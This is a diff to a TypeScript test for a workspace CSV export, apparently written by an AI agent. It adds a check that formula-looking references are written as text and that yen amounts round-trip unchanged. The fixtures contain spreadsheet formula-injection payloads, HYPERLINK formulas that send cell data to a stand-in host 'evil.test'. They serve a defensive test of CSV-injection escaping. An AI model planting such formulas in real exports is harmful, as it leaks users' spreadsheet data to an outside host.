@@ -4,6 +4,7 @@ import assert from 'node:assert/strict';
 import crypto from 'node:crypto';
 import type { Server } from 'node:http';
 import { closeServer, listenOnRandomPort, restoreEnv, signTestJwt, useLiveApiEnv } from './helpers/liveApiServer';
+import { parseCsv } from '../lib/csv';
 
 const hasDb = Boolean(process.env.LF_TEST_DATABASE_URL);
 describe('#962 workspace CSV export', { skip: !hasDb && 'needs LF_TEST_DATABASE_URL' }, () => {
@@ -26,6 +27,8 @@ describe('#962 workspace CSV export', { skip: !hasDb && 'needs LF_TEST_DATABASE_
     await tx('usd', { description: ' =HYPERLINK("https://evil.test/x?d="&A1,"Open")', totalAmountCents: 1650000, currency: 'USD', reference: 'INV-1' });
     await tx('jpy', { description: 'Tokyo rent', totalAmountCents: 1000000, currency: 'JPY', reference: 'INV-2' });
     await tx('kwd', { description: 'Kuwait retainer', totalAmountCents: 12345, currency: 'KWD', reference: 'INV-3' });
+    // J-10 (Agent #11): a formula-looking name/reference is text as well
+    await tx('ref', { description: 'Ordinary sale', totalAmountCents: 500, currency: 'USD', reference: '=HYPERLINK("https://evil.test/collect")' });
     const app = await createApp();
     ({ server, base } = await listenOnRandomPort(app));
   });
@@ -51,5 +54,11 @@ describe('#962 workspace CSV export', { skip: !hasDb && 'needs LF_TEST_DATABASE_
     assert.match(csv, /"16500\.00"/, 'dollars keep two decimals');
     assert.doesNotMatch(csv, /"\s*=HYPERLINK/, 'the formula is not live');
     assert.match(csv, /"' =HYPERLINK/, 'the formula is written as text');
+    assert.match(csv, /"'=HYPERLINK/, 'a formula-looking reference is written as text too');
+    // J-10 (Agent #11): the yen row round-trips through the shared CSV reader exactly as stored
+    const parsed = parseCsv(csv);
+    const yen = parsed.find(r => r[2] === 'Tokyo rent');
+    assert.ok(yen, 'the yen row is in the parsed CSV');
+    assert.equal(yen[1], '1000000', 'JPY 1000000 minor units round-trip unchanged (0 decimals, no /100)');
   });
 });
